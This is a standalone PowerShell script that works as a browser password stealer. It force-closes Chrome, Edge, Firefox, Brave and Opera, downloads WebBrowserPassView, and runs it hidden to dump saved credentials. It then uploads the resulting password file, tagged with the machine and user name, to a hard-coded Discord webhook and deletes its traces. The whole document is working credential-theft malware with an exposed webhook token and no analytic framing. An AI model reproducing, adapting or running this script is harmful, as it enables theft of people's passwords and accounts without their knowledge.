$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

function Send-Discord {
    param([string]$msg)
    try {
        Invoke-RestMethod -Uri $wh -Method Post -Body (@{content=$msg}|ConvertTo-Json) -ContentType 'application/json' | Out-Null
    } catch {}
}

Send-Discord "🟢 START - $env:COMPUTERNAME | $env:USERNAME"

Get-Process chrome,msedge,firefox,brave,opera -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 3

Set-Location $env:TEMP
Remove-Item wbpv* -Recurse -Force -EA 0

Send-Discord "📥 Downloading..."

try {
    [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
    
    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip" -OutFile "wbpv.zip" -UseBasicParsing
    
    if (!(Test-Path "wbpv.zip")) {
        Send-Discord "❌ Download failed"
        exit
    }
    
    Send-Discord "✅ Downloaded - $([math]::Round((Get-Item 'wbpv.zip').Length/1KB,2)) KB"
    
    Send-Discord "📦 Extracting..."
    Expand-Archive "wbpv.zip" -Force -EA Stop
    
    $exe = Get-ChildItem -Filter "WebBrowserPassView.exe" -Recurse | Select-Object -First 1
    
    if (!$exe) {
        Send-Discord "❌ EXE not found"
        exit
    }
    
    Send-Discord "🔓 Extracting passwords..."
    
    $outFile = "passwords_$(Get-Date -Format 'HHmmss').txt"
    
    Start-Process $exe.FullName -ArgumentList "/stext $outFile" -Wait -WindowStyle Hidden
    
    Start-Sleep 3
    
    if (Test-Path $outFile) {
        $content = Get-Content $outFile -Raw -EA 0
        $count = if($content){([regex]::Matches($content, "Password:")).Count}else{0}
        $size = [math]::Round((Get-Item $outFile).Length / 1KB, 2)
        
        Send-Discord "📤 Found $count passwords - Uploading $size KB..."
        
        curl.exe -F "file=@$outFile" -F "content=🔑 **$count PASSWORDS**`n$env:COMPUTERNAME | $env:USERNAME`n$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" $wh
        
        Send-Discord "✅ SUCCESS"
        Remove-Item $outFile -Force
    } else {
        Send-Discord "❌ No output file created"
    }
    
} catch {
    Send-Discord "❌ Error: $($_.Exception.Message -replace '\"',"'")"
}

Remove-Item wbpv* -Recurse -Force -EA 0

Send-Discord "🧹 DONE"
